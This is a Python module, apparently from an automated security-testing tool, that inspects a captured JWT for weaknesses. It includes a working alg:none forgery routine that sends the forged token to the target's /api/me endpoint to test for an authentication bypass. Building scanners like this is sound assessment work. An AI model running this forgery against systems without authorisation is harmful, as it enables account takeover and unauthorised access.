"""Auth/JWT misconfiguration executor."""

from __future__ import annotations

import base64
import json

from wth_ai.executor.vuln.base import BaseVulnExecutor
from wth_ai.models import ExecutorResult, ExecutorTask


class AuthVulnExecutor(BaseVulnExecutor):
    vuln_type = "auth_jwt"

    def execute(self, task: ExecutorTask) -> ExecutorResult:
        jwt = self.state.metadata.get("captured_jwt", "")
        for role in self.sessions.roles.values():
            if role.jwt:
                jwt = role.jwt
                break

        if not jwt or jwt.count(".") != 2:
            return self._result(
                task, status="success",
                summary="No JWT captured — login first or set metadata captured_jwt",
                evidence=[], observations=["Run with authenticated sessions"],
                risk="low",
            )

        header_b64, payload_b64, sig = jwt.split(".")
        evidence: list[str] = []
        observations: list[str] = []

        try:
            pad = lambda s: s + "=" * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            payload = json.loads(base64.urlsafe_b64decode(pad(payload_b64)))
            observations.append(f"alg={header.get('alg')}")
            if header.get("alg", "").lower() == "none":
                evidence.append("JWT uses alg:none")
            if "exp" not in payload:
                evidence.append("JWT missing exp claim")
            if payload.get("role") == "admin" or payload.get("admin") is True:
                observations.append("Token contains admin claim")
        except Exception as exc:
            observations.append(f"JWT parse error: {exc}")

        forged = self._forge_alg_none(header_b64, payload_b64)
        if forged:
            import requests
            test_url = task.target if task.target.startswith("http") else f"https://{task.target}/api/me"
            try:
                r = requests.get(test_url, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
                if r.status_code == 200:
                    evidence.append("alg:none forged token accepted")
                    observations.append(f"forged_status={r.status_code}")
            except Exception:
                pass

        return self._result(
            task, status="success",
            summary="JWT misconfiguration checks",
            evidence=evidence, observations=observations,
            risk="critical" if "alg:none" in " ".join(evidence) else "medium",
        )

    def _forge_alg_none(self, header_b64: str, payload_b64: str) -> str:
        try:
            pad = lambda s: s + "=" * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            header["alg"] = "none"
            new_h = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
            return f"{new_h}.{payload_b64}."
        except Exception:
            return ""
